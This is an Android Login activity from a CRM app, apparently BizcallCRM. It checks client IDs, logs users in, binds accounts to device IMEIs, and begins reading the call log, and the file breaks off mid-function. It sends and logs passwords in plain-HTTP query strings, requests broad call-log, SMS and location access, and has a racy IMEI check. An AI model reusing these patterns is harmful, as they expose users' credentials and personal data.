package com.bizcall.wayto.sample;

import android.Manifest;
import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.AlertDialog;
import android.app.KeyguardManager;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.hardware.fingerprint.FingerprintManager;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.CallLog;
import android.security.keystore.KeyGenParameterSpec;
import android.security.keystore.KeyPermanentlyInvalidatedException;
import android.security.keystore.KeyProperties;
import android.support.annotation.RequiresApi;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.RecyclerView;
import android.telephony.TelephonyManager;
import android.text.format.Formatter;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.RetryPolicy;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.URLEncoder;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.KeyStore;
import java.security.KeyStoreException;
import java.security.NoSuchAlgorithmException;
import java.security.NoSuchProviderException;
import java.security.UnrecoverableKeyException;
import java.security.cert.CertificateException;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Collections;
import java.util.Date;
import java.util.Enumeration;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;

/*import com.google.android.gms.common.ConnectionResult;
import com.google.android.gms.common.api.GoogleApiClient;*/

public class Login extends AppCompatActivity /*implements GoogleApiClient.ConnectionCallbacks,
        GoogleApiClient.OnConnectionFailedListener, com.google.android.gms.location.LocationListener*/  {

    public static TextView edtName, edtPassword,edtClientId;
    RequestQueue requestQueue;
    Button btnLogin,btnVerify;
    Intent intent;

    //SMS ////
    ArrayList<SMSDetails> mSMSArrayList;
    RecyclerView recyclerView;
    SMSDetails smsDetails;

    String urlCallDate;
    private ArrayList<CallDetialswithIMEI> mCallArrayList;
    //private ArrayList<SMSDetails> mSMSArrayList;
    private CallDetialswithIMEI callDetails;
    private SimpleDateFormat sdfSaveArray;
    private Calendar calendar;
   // private RequestQueue requestQueue;
    private TelephonyManager telephonyManager;
    //private LatLng latlang;
    //private GoogleMap mMap;

    int counturl = 0,countsmsurl=0;
    int day, month, year;
    double currentLat, currentLong;
    int resultImeiexist=0;

    String callPhoneno, finalCallType, strdateFormated, callDuration, strImei1, strImei2, callphAccID;



    private ArrayList<CallDetialswithIMEI>  mUploadCallArrayList;
    private ArrayList<CallDetailsFetch> mUrlCallArrayList;
    private ArrayList<SMSDetails> mUploadSMSArrayList;
    private ArrayList<SMSDetailsFetch> mUrlSMSArrayList;
    private CallDetialswithIMEI callDetialswithIMEI;
    private CallDetailsFetch callDetailsFetch;
    private SMSDetailsFetch smsDetailsFetch;
    private SimpleDateFormat sdfComapre;
    //private GoogleApiClient mGoogleApiClient;
    private Location mLocation;
    private LocationManager locationManager;



        String urlSMSDate;
    String  strIMEI1, strIMEI2;
    ProgressDialog dialog;
    String username, pwd, url;
    SharedPreferences sp;
    SharedPreferences.Editor editor;
    UrlRequest urlRequest;
    int flag = 0,temp=0;
    LinearLayout linearLogin,linearClientVerify;
        int conditon=1;

    ImageView imgError1, imgError2;
    String clienturl, IMEINumber1,IMEINumber2, clientid;
    String ip,login,counselorId,clientid1;
    long timeout=10000;
    int loginCount;
    TextView txtResponse,txtClientID;


    private FingerprintManager fingerprintManager;
    private KeyguardManager keyguardManager;

    private KeyStore keyStore;
    private Cipher cipher;
    private String KEY_NAME = "AndroidKey";
    int reqcode=1;
    ArrayList<String> arrayListUrl;
    LinearLayout linearContact;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_login);

        try {
            linearClientVerify = findViewById(R.id.linearClientVerify);
            linearLogin = findViewById(R.id.linearLogin);
            txtResponse = findViewById(R.id.txtResponse);
            btnVerify = findViewById(R.id.btnVerify);
            edtClientId = findViewById(R.id.edtClientId);
            linearContact=findViewById(R.id.linearContact);
            sp = getApplicationContext().getSharedPreferences("Settings", Context.MODE_PRIVATE);
            editor = sp.edit();
            requestQueue = Volley.newRequestQueue(Login.this);
            edtName = findViewById(R.id.edtUsername);
            edtPassword = findViewById(R.id.edtPassword);
            txtClientID = findViewById(R.id.txtClientId);
            arrayListUrl = new ArrayList<>();

            if (checkPermission()) {
                Toast.makeText(Login.this, "Permission already granted", Toast.LENGTH_SHORT).show();
            }// if (checkPermission())
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_PHONE_STATE}, 1);
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_CALL_LOG}, 1);
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_SMS}, 1);
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, 1);
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_COARSE_LOCATION}, 1);

            //  clientid = "AnDe828500";
            //  timeout=50000L;
            // clienturl="http://anilsahasrabuddhe.in/CRM/AnDe828500/AnDe828500.php";
            //  loginCount=(sp.getInt("LoginCount",0));

            btnLogin = findViewById(R.id.btnLogin);
            onClick();

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                String[] per = {Manifest.permission.READ_PHONE_STATE};
                requestPermissions(per, reqcode);

                TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
                if (ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {

                        IMEINumber1 = tm.getImei(2);
                        IMEINumber2=tm.getImei(1);
                        editor.putString("IMEI1",IMEINumber1);
                        editor.putString("IMEI2",IMEINumber2);
                        editor.commit();
                          Log.d("IMEI**",IMEINumber1+IMEINumber2);
                    }//if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                } //(ActivityCompat.checkSelfPermission(
                 else {

                    IMEINumber1 = tm.getDeviceId(2);
                    IMEINumber2=tm.getDeviceId(1);
                        editor.putString("IMEI1",IMEINumber1);
                        editor.putString("IMEI2",IMEINumber2);
                        editor.commit();
                       Log.d("IMEI**",IMEINumber1+" "+IMEINumber2);
                }// else (ActivityCompat.checkSelfPermission(
            }//(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)

           /* if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {

                fingerprintManager = (FingerprintManager) getSystemService(FINGERPRINT_SERVICE);
                keyguardManager = (KeyguardManager) getSystemService(KEYGUARD_SERVICE);

                if (!fingerprintManager.isHardwareDetected()) {
                    txtResponse.setText("Fingerprint Scanner is not detected in your Device.");
                } else if (ContextCompat.checkSelfPermission(Login.this,
                        Manifest.permission.USE_FINGERPRINT) != PackageManager.PERMISSION_GRANTED) {
                    txtResponse.setText("Permission not granted to use Fingerprint Scanner.");
                } else if (!keyguardManager.isKeyguardSecure()) {
                    txtResponse.setText("Add Lock to your Mobile from Setting.");
                } else if (!fingerprintManager.hasEnrolledFingerprints()) {
                    txtResponse.setText("You should add atleast 1 fingerprint to use this Application.");
                } else {
                    txtResponse.setText("Place your finger on scanner to access this Application");
                    generateKey();
                    if (cipherInit()) {
                        FingerprintManager.CryptoObject cryptoObject = new FingerprintManager.CryptoObject(cipher);
                        FingerprintHandler fingerprintHandler = new FingerprintHandler(this);
                        fingerprintHandler.startAuth(fingerprintManager, cryptoObject);
                    }
                }
            }//(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)*/
        }//try
        catch (Exception e)
        {
            Log.d("Exception", String.valueOf(e));
        }//catch (Exception e)


    }//onCreate close


    private boolean checkPermission() {
        String[] perm = {Manifest.permission.READ_PHONE_STATE,Manifest.permission.READ_SMS,Manifest.permission.READ_CALL_LOG,Manifest.permission.ACCESS_FINE_LOCATION,Manifest.permission.ACCESS_COARSE_LOCATION};
        List<String> reqPerm = new ArrayList<>();
        try {


        int i = 0;

        for (String permis : perm) {
            int resultPhone = ContextCompat.checkSelfPermission(Login.this, permis);
            if (resultPhone == PackageManager.PERMISSION_GRANTED)
                i++;
            else {
                reqPerm.add(permis);
            }
        }

        if (i == 1)
            return true;
        else
            return requestPermission(reqPerm);
        }
        catch (Exception e)
        {
            Log.d("Exception", String.valueOf(e));
            return requestPermission(reqPerm);

        }
    }


    private boolean requestPermission(List<String> perm) {
        try
        {
        // String[] permissions={Manifest.permission.READ_PHONE_STATE,Manifest.permission.RECORD_AUDIO,Manifest.permission.READ_EXTERNAL_STORAGE,Manifest.permission.WRITE_EXTERNAL_STORAGE};
        String[] listReq = new String[perm.size()];
        listReq = perm.toArray(listReq);
        for (String permissions : listReq) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(Login.this, permissions)) {
                Toast.makeText(getApplicationContext(), "Phone Permissions needed for " + permissions, Toast.LENGTH_LONG);
            }
        }

        ActivityCompat.requestPermissions(Login.this, listReq, 1);


        return false;
        }
        catch (Exception e)
        {
            Log.d("Exception", String.valueOf(e));

            return false;
        }
    }


    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        switch (requestCode) {
            case 1:
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED)
                    Toast.makeText(getApplicationContext(), "Permission Granted to access Phone calls", Toast.LENGTH_LONG);
                else
                    Toast.makeText(getApplicationContext(), "You can't access Phone calls", Toast.LENGTH_LONG);
                break;
        }
    }
    public void getClientDetails(String url) {

        urlRequest = UrlRequest.getObject();
        urlRequest.setContext(getApplicationContext());
        //String clienturl="http://anilsahasrabuddhe.in/CRM/AnDe828500/cases.php";
        urlRequest.setUrl(url);
        Log.d("ClientDetailsUrl", url);
        urlRequest.getResponse(new ServerCallback()
        {
            @Override
            public void onSuccess(String response) throws JSONException
            {
                try {
                    dialog.dismiss();
                    Log.d("ClientDetailsResponse", response);
                    if (!response.contains("User not Identified")) {
                        JSONObject jsonObject = new JSONObject(response);
                        // Log.d("Json",jsonObject.toString());
                        JSONArray jsonArray = jsonObject.getJSONArray("data");
                        for (int i = 0; i < jsonArray.length(); i++) {
                            JSONObject jsonObject1 = jsonArray.getJSONObject(i);
                            clienturl = jsonObject1.getString("ClientUrl");
                            String timeout1 = jsonObject1.getString("TimeOut");
                            clientid = jsonObject1.getString("ClientId");
                            timeout = Long.parseLong(timeout1);
                            Log.d("ClientUrl**",clienturl);
                          //  editor = sp.edit();
                            editor.putString("ClientId", clientid);
                            editor.putLong("TimeOut", timeout);
                            editor.putString("ClientUrl", clienturl);
                            editor.commit();
                            }

                            linearClientVerify.setVisibility(View.GONE);
                            if(linearLogin.getVisibility()==View.GONE) {
                                edtClientId.setText("");
                                txtClientID.setText("ClientID:"+clientid);
                                linearLogin.setVisibility(View.VISIBLE);
                                linearContact.setVisibility(View.GONE);
                            }
                    }
                else
                    {
                        Toast.makeText(Login.this, "Invalid Client", Toast.LENGTH_SHORT).show();
                    }
                }catch(Exception e){
                    Toast.makeText(Login.this,"Got exception",Toast.LENGTH_SHORT).show();
                    Log.d("Exception", String.valueOf(e));
                    }
                    }
        });
    }

public  void  onClick()
{
    btnLogin.setOnClickListener(new View.OnClickListener()
    {
        @Override
        public void onClick(View v) {
            try {
            username = edtName.getText().toString();
            Log.d("Name111", username);
            pwd = edtPassword.getText().toString();
            // url="http://anilsahasrabuddhe.in/CRM/AnDe828500/cases.php?caseid=4";
            Log.d("Url111", clienturl+"?clientid=" + clientid + "&caseid=1&UserName=" + username + "&UserPassword=" + pwd);
            if (username.length() == 0) {
                edtName.setError("Please enter name");
                flag = 1;
            }
            if (pwd.length() == 0) {
                edtPassword.setError("Please enter password");
                flag = 1;
            }
            if (flag == 0)
            {
                dialog = ProgressDialog.show(Login.this, "", "Logging in", false, true);

                checkData();

                refreshWhenLoading();
            }
            flag = 0;
        }catch(Exception e){
        Log.d("Exception", String.valueOf(e));
    }
        }
    });

    btnVerify.setOnClickListener(new View.OnClickListener() {
        @Override
        public void onClick(final View v) {
            try {
                clientid1 = edtClientId.getText().toString();

                Log.d("CId", clientid1);
                if (clientid1.length() == 0) {
                    edtClientId.setError("Invalid client id");
                    flag = 1;
                }
                if (flag == 0) {

                    dialog = ProgressDialog.show(Login.this, "", "Verifying client", false, true);
                    url = "http://anilsahasrabuddhe.in/CRM/ClientDetails.php?clientid=" + clientid1;
                    getClientDetails(url);

                 //  refreshWhenLoading();

                    /*new CountDownTimer(timeout, 1000) {

                        public void onTick(long millisUntilFinished) {
                            //mtextView.setText("seconds remaining: " + millisUntilFinished / 1000);
                        }

                        public void onFinish() {
                            conditon++;
                           *//* if (dialog.isShowing()) {
                                dialog.dismiss();
                                if (conditon == 2) {
                                    v.performClick();
                                    url = "http://mentebit.com/CRM/ClientDetails.php?clientid=" + clientid1;
                                    getClientDetails(url);
                                } else if (conditon == 3) {
                                    v.performClick();
                                    url = "http://bizcallcrm.com/CRM/ClientDetails.php?clientid=" + clientid1;
                                    getClientDetails(url);
                                }
                            }*//*
                        }

                        // finish();
                        //startActivity(getIntent());
                    }.start();*/


                    //flag = 0;
                }

            } catch (Exception e) {
                Log.d("Exception", String.valueOf(e));
            }
        }
    });

    }

    @TargetApi(Build.VERSION_CODES.M)
    private void generateKey() {
        try {
            keyStore = KeyStore.getInstance("AndroidKeyStore");
            KeyGenerator keyGenerator = KeyGenerator.getInstance(KeyProperties.KEY_ALGORITHM_AES, "AndroidKeyStore");

            keyStore.load(null);
            keyGenerator.init(new
                    KeyGenParameterSpec.Builder(KEY_NAME,
                    KeyProperties.PURPOSE_ENCRYPT |
                            KeyProperties.PURPOSE_DECRYPT)
                    .setBlockModes(KeyProperties.BLOCK_MODE_CBC)
                    .setUserAuthenticationRequired(true)
                    .setEncryptionPaddings(
                            KeyProperties.ENCRYPTION_PADDING_PKCS7)
                    .build());
            keyGenerator.generateKey();
        } catch (KeyStoreException | IOException | CertificateException
                | NoSuchAlgorithmException | InvalidAlgorithmParameterException
                | NoSuchProviderException e) {
            e.printStackTrace();
        }
    }

    @TargetApi(Build.VERSION_CODES.M)
    public boolean cipherInit() {
        try {
            cipher = Cipher.getInstance(KeyProperties.KEY_ALGORITHM_AES + "/" + KeyProperties.BLOCK_MODE_CBC + "/" + KeyProperties.ENCRYPTION_PADDING_PKCS7);
        } catch (NoSuchAlgorithmException | NoSuchPaddingException e) {
            throw new RuntimeException("Failed to get Cipher", e);
        }
        try {
            keyStore.load(null);
            SecretKey key = (SecretKey) keyStore.getKey(KEY_NAME,null);
            cipher.init(Cipher.ENCRYPT_MODE, key);
            return true;
        } catch (KeyPermanentlyInvalidatedException e) {
            return false;
        } catch (KeyStoreException | CertificateException | UnrecoverableKeyException | IOException | NoSuchAlgorithmException | InvalidKeyException e) {
            throw new RuntimeException("Failed to init Cipher", e);
        }
    }


    public void checkData()
    {
        urlRequest = UrlRequest.getObject();
        urlRequest.setContext(getApplicationContext());
        url = clienturl+"?clientid=" + clientid + "&caseid=1&UserName=" + username + "&UserPassword=" + pwd;
        urlRequest.setUrl(url);
        urlRequest.getResponse(new ServerCallback()
        {
            @Override
            public void onSuccess(String response) throws JSONException {

                //temp=1;
                WifiManager wm = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
                ip = Formatter.formatIpAddress(wm.getConnectionInfo().getIpAddress());
                Log.d("IPP", ip);
                // getLocalIpAddress();

               dialog.dismiss();
                Log.d("LoginResponse", response);
                if (response.startsWith("Array")) {
                    String uname = response.substring(response.indexOf("[UserName] =>") + 13, response.indexOf("[UserPassword] =>"));
                    String emailID = response.substring(response.indexOf("[cEmailAdd] =>") + 14, response.indexOf("[cEmailPassword] =>"));
                    String mobile = response.substring(response.indexOf("[cMobileNO] =>") + 14, response.indexOf("[cProfilePhoto] => "));
                    String role = response.substring(response.indexOf("[UserRole] =>") + 13, response.indexOf("[Status] =>"));
                    counselorId = response.substring(response.indexOf("[cCounselorID] =>") + 17, response.indexOf(" [cCounselorName] =>"));
                    String statusid = response.substring(response.indexOf("[Status] =>") + 11, response.indexOf("[cEmailAdd] =>"));
                    strImei1 = response.substring(response.indexOf("[IMEI1] =>") + 10, response.indexOf("[IMEI2]")).trim();
                    strImei2 = response.substring(response.indexOf("[IMEI2] =>") + 10);
                    strImei2 = strImei2.substring(1, strImei2.length() - 4).trim();

                    String role1 = "";

                    if (strImei1.equals("0")||strImei2.equals("0")) {
                        Log.d("IMEI", strImei1 + " " + strImei2);
                        int condition=0;
                        try {
                            if (IMEINumber1.length() > 4||IMEINumber2.length() > 4) {
                                condition = 1;
                            }
                            else
                                {
                                    condition = 0;
                                }

                        } catch (Exception e) {
                            Log.d("Exception", String.valueOf(e));
                            //condition = 0;
                        }

                        if (condition == 1) {
                            AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(Login.this);
                            alertDialogBuilder.setTitle("Your IMEI No is:" + IMEINumber1 + " " + IMEINumber2)
                                    .setMessage("No mobile attached with this ID  Do you want to add this device as Primary device?")

                                    // Specifying a listener allows you to take an action before dismissing the dialog.
                                    // The dialog is automatically dismissed when a dialog button is clicked.
                                    .setPositiveButton("Yes", new DialogInterface.OnClickListener() {
                                        public void onClick(DialogInterface dialog, int which) {
                                            insertIMEI();
                                            edtName.setText("");
                                            edtPassword.setText("");
                                            dialog.dismiss();
                                        }
                                    })

                                    // A null listener allows the button to dismiss the dialog and take no further action.
                                    .setNegativeButton("No", new DialogInterface.OnClickListener() {
                                        @Override
                                        public void onClick(DialogInterface dialog, int which) {
                                            dialog.dismiss();
                                            linearClientVerify.setVisibility(View.VISIBLE);
                                            linearLogin.setVisibility(View.GONE);
                                            edtName.setText("");
                                            edtPassword.setText("");
                                        }
                                    })
                                    .show();
                        } else {
                            Log.d("Alert", "ALert111");
                            AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(Login.this);
                            alertDialogBuilder.setTitle("Phone permission is not allowed for BizcallCRM")
                                    .setMessage("Goto->Settings->App Permission->Bizcall and allow phone permission")

                                    // Specifying a listener allows you to take an action before dismissing the dialog.
                                    // The dialog is automatically dismissed when a dialog button is clicked.
                                    .setPositiveButton("OK", new DialogInterface.OnClickListener() {
                                        public void onClick(DialogInterface dialog, int which) {
                                            dialog.dismiss();
                                            intent = new Intent(Intent.ACTION_MAIN);
                                            intent.addCategory(Intent.CATEGORY_HOME);
                                            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                            startActivity(intent);
                                            finish();
                                        }
                                    })

                                    // A null listener allows the button to dismiss the dialog and take no further action.

                                    .show();

                        }
                    }
                    else if(strImei1.equals(IMEINumber1)||strImei2.equals(IMEINumber2))
                    {
                        editor.putString("Name", uname);
                        editor.putString("Id", counselorId);
                        editor.putString("EmailId", emailID);
                        editor.putString("Role", role1);
                        editor.putString("MobileNo", mobile);
                        editor.putString("StatusId", statusid);
                        editor.commit();
                        try {
                            ip = URLEncoder.encode(ip, "UTF-8");
                        } catch (UnsupportedEncodingException e) {
                            e.printStackTrace();
                        }
                        counselorId = counselorId.replace(" ", "");
                        insertLoginInfo();
                        insertPointCollection();

                        Log.d("Logincount", String.valueOf(loginCount));

                        Log.d("Role1111", role1);
                        Toast.makeText(Login.this, "Login successful", Toast.LENGTH_SHORT).show();
                       //getCallDetails();
                        //getSMSDetails();
                       // getUserLocation();
                        intent = new Intent(Login.this, Home.class);
                        intent.putExtra("Activity","Login");
                        startActivity(intent);
                        finish();
                    }
                    else {
                        AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(Login.this);
                        alertDialogBuilder.setTitle("Device Authorization Failed")
                                .setMessage("Your ID is registered on device IMEI ending with"+strImei1.substring(strImei1.length()-4,strImei1.length()))

                                // Specifying a listener allows you to take an action before dismissing the dialog.
                                // The dialog is automatically dismissed when a dialog button is clicked.
                                .setPositiveButton("OK", new DialogInterface.OnClickListener() {
                                    public void onClick(DialogInterface dialog, int which) {
                                        //insertIMEI();
                                        /*edtName.setText("");
                                        edtPassword.setText("");*/
                                        dialog.dismiss();
                                    }
                                })

                                // A null listener allows the button to dismiss the dialog and take no further action.
                                /*.setNegativeButton("No", new DialogInterface.OnClickListener() {
                                    @Override
                                    public void onClick(DialogInterface dialog, int which) {
                                        dialog.dismiss();
                                        linearClientVerify.setVisibility(View.VISIBLE);
                                        linearLogin.setVisibility(View.GONE);
                                        edtName.setText("");
                                        edtPassword.setText("");
                                    }
                                })*/
                                .show();
                        }
                }
                else{
                            Toast.makeText(Login.this, "Login failed", Toast.LENGTH_SHORT).show();
                    }

            }
        });
    }

   public void refreshWhenLoading()
   {
       final Timer t = new Timer();
       t.schedule(new TimerTask() {
           public void run() {
               if(dialog.isShowing()) {
                   Intent intent = new Intent(Login.this, Login.class);
                   startActivity(intent);// when the task active then close the dialog
                   t.cancel(); // also just top the timer thread, otherwise, you may receive a crash report
               }
           }
       }, 12000); // after 12 second (or 2000 miliseconds), the task will be active.

   }

    public String getLocalIpAddress() {
        try {
            for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements();) {
                NetworkInterface intf = en.nextElement();
                for (Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements();) {
                    InetAddress inetAddress = enumIpAddr.nextElement();
                    if (!inetAddress.isLoopbackAddress()) {
                        String ip = Formatter.formatIpAddress(inetAddress.hashCode());
                        Log.d("InMain", "***** IP="+ ip);
                        return ip;
                    }
                }
            }
        } catch (SocketException ex) {
            Log.e("InMain", ex.toString());
        }
        return null;
    }

    public void insertLoginInfo()
    {
        try {
            urlRequest = UrlRequest.getObject();
            urlRequest.setContext(getApplicationContext());
            urlRequest.setUrl(clienturl + "?clientid=" + clientid + "&caseid=16&CounsellorId=" + counselorId + "&IpAddress1=" + ip);
            Log.d("LoginInfoResponse", clienturl + "?clientid=" + clientid + "&caseid=16&CounsellorId=" + counselorId + "&IpAddress=" + ip);
            urlRequest.getResponse(new ServerCallback() {
                @Override
                public void onSuccess(String response) throws JSONException {
                    if (dialog.isShowing()) {
                        dialog.dismiss();
                    }
                    Log.d("RestRefNameResponse", response);
                    if (response.contains("Data inserted successfully")) {
                        Toast.makeText(Login.this, "Data inserted successfully", Toast.LENGTH_SHORT).show();
                    } else {
                        Toast.makeText(Login.this, "Data not inserted successfully", Toast.LENGTH_SHORT).show();
                    }
                    //   Log.d("Size**", String.valueOf(arrayList.size()));
                }
            });
        }catch(Exception e){
            Log.d("Exception", String.valueOf(e));
        }
    }
    public void insertPointCollection()
    {
       try {
           urlRequest = UrlRequest.getObject();
            urlRequest.setContext(getApplicationContext());
            urlRequest.setUrl(clienturl+"?clientid=" + clientid + "&caseid=36&nCounsellorId=" + counselorId + "&nEventId=1");
            Log.d("PointCollectionResponse", clienturl+"?clientid=" + clientid + "&caseid=36&nCounsellorId=" + counselorId + "&nEventId=1");
            urlRequest.getResponse(new ServerCallback() {
            @Override
            public void onSuccess(String response) throws JSONException {
                if (dialog.isShowing()) {
                    dialog.dismiss();
                }
                Log.d("PointCollectionResponse", response);
                if (response.contains("Data inserted successfully")) {
                    Toast.makeText(Login.this, "Data inserted successfully", Toast.LENGTH_SHORT).show();
                } else {
                    Toast.makeText(Login.this, "Data not inserted successfully", Toast.LENGTH_SHORT).show();
                }
                //   Log.d("Size**", String.valueOf(arrayList.size()));
            }
        });
       }catch(Exception e){
           Log.d("Exception", String.valueOf(e));
       }
    }
    public void insertIMEI()
    {
        try {
            urlRequest = UrlRequest.getObject();
            urlRequest.setContext(getApplicationContext());
            String urlIMEI=clienturl+"?clientid=" + clientid + "&caseid=49&CounselorID=" + counselorId+"&IMEI1="+IMEINumber1+"&IMEI2="+IMEINumber2;

            String checIMEIResponse=checkIMEI(IMEINumber1);
            Log.d("checIMEIResponse",checIMEIResponse);
            if(checIMEIResponse.equals("0")) {

                urlRequest.setUrl(urlIMEI);
                Log.d("insertIMEIUrl", urlIMEI);
                urlRequest.getResponse(new ServerCallback() {
                    @Override
                    public void onSuccess(String response) throws JSONException {
                        if (dialog.isShowing()) {
                            dialog.dismiss();
                        }
                        Log.d("insertIMEIResponse", response);
                        if (response.contains("Data inserted successfully")) {
                            linearClientVerify.setVisibility(View.VISIBLE);
                            linearLogin.setVisibility(View.GONE);
                            Toast.makeText(Login.this, "Data inserted successfully", Toast.LENGTH_SHORT).show();
                        } else {
                            Toast.makeText(Login.this, "Data not inserted successfully", Toast.LENGTH_SHORT).show();
                        }
                        //   Log.d("Size**", String.valueOf(arrayList.size()));
                    }
                });
            }
            else
            {
                AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(Login.this);
                alertDialogBuilder.setTitle("Device authorization failed")
                        .setMessage("This IMEI"+IMEINumber1+" is already assigned. Contact admin")
                        // Specifying a listener allows you to take an action before dismissing the dialog.
                        // The dialog is automatically dismissed when a dialog button is clicked.
                        .setPositiveButton("OK", new DialogInterface.OnClickListener() {
                            public void onClick(DialogInterface dialog, int which) {
                                //insertIMEI();

                                dialog.dismiss();
                            }
                        })

                        // A null listener allows the button to dismiss the dialog and take no further action.
                       /* .setNegativeButton("No", new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface dialog, int which) {
                                dialog.dismiss();
                                linearClientVerify.setVisibility(View.VISIBLE);
                                linearLogin.setVisibility(View.GONE);
                                edtName.setText("");
                                edtPassword.setText("");
                            }
                        })*/
                        .show();
            }
        }catch(Exception e){
            Log.d("Exception", String.valueOf(e));
        }
    }
    public String checkIMEI(String strIMEI) {

        urlRequest = UrlRequest.getObject();
        urlRequest.setContext(getApplicationContext());
        String checkIMEIurl = clienturl + "?clientid=" + clientid + "&caseid=50&IMEI=" + strIMEI;
        ;
        urlRequest.setUrl(checkIMEIurl);
        Log.d("IMEIurl", checkIMEIurl);
        urlRequest.getResponse(new ServerCallback() {
            @Override
            public void onSuccess(String response) throws JSONException {

                dialog.dismiss();
                Log.d("IEMIResponse", response);
                try {
                    if (!response.contains("User not Identified")) {
                        JSONObject jsonObject = new JSONObject(response);
                        // Log.d("Json",jsonObject.toString());
                        JSONArray jsonArray = jsonObject.getJSONArray("data");
                        if (response.contains("[]")) {
                            Log.d("resultImeiexist", "1");
                            resultImeiexist = 1;
                        }

                    } else {
                        resultImeiexist = 1;
                        Toast.makeText(Login.this, "Invalid Client", Toast.LENGTH_SHORT).show();
                    }
                } catch (Exception e) {
                    Log.d("Exception", String.valueOf(e));
                }
            }
        });
        if (resultImeiexist == 1) {
            return "1";
        } else {
            return "0";
        }
    }

   /* public  void loginUsingFingerPrint() {
        urlRequest = UrlRequest.getObject();
        urlRequest.setContext(getApplicationContext());
        //String clienturl="http://anilsahasrabuddhe.in/CRM/AnDe828500/cases.php";
        urlRequest.setUrl(clienturl+"?clientid=" + clientid + "&caseid=41&IMEI=" + IMEINumber);
        Log.d("CojnUrl", clienturl+"?clientid=" + clientid + "&caseid=41&IMEI=" +IMEINumber);
        urlRequest.getResponse(new ServerCallback() {
            @Override
            public void onSuccess(String response) throws JSONException {

                Log.d("IMEIResponse", response);

                    if(!response.contains("[]"))
                    {
                        Toast.makeText(Login.this, "Login successful", Toast.LENGTH_SHORT).show();
                    }
                    else
                    {
                        Toast.makeText(Login.this, "Login not successful", Toast.LENGTH_SHORT).show();

                    }

            }
        });
    }*/


    @Override
    public void onBackPressed() {
        super.onBackPressed();
        editor = sp.edit();
        editor.putString("UserName", null);
        editor.putString("Id", null);
        editor.commit();
    }



    ////Calls--------------------------------------------

    @SuppressLint("NewApi")
    public void getCallDetails() {

        if (ContextCompat.checkSelfPermission(Login.this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(Login.this, Manifest.permission.READ_CALL_LOG)) {
                ActivityCompat.requestPermissions(Login.this, new String[]
                        {Manifest.permission.READ_CALL_LOG}, 1);
            } else {
                ActivityCompat.requestPermissions(Login.this, new String[]
                        {Manifest.permission.READ_CALL_LOG}, 1);
            }
        } else {
            getCallLogDetails();
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.M)
    private void getCallLogDetails() {

        Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null,
                null, null, null);
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
        int phAccID = managedCursor.getColumnIndex(CallLog.Calls.PHONE_ACCOUNT_ID);

        mCallArrayList = new ArrayList<>();
        mUrlCallArrayList = new ArrayList<>();
        mUploadCallArrayList = new ArrayList<>();
        sdfComapre = new SimpleDateFormat("yyyy-MM-dd HH:mm:sss");

        while (managedCursor.moveToNext()) {
            callPhoneno = managedCursor.getString(number);
            String callType = managedCursor.getString(type);
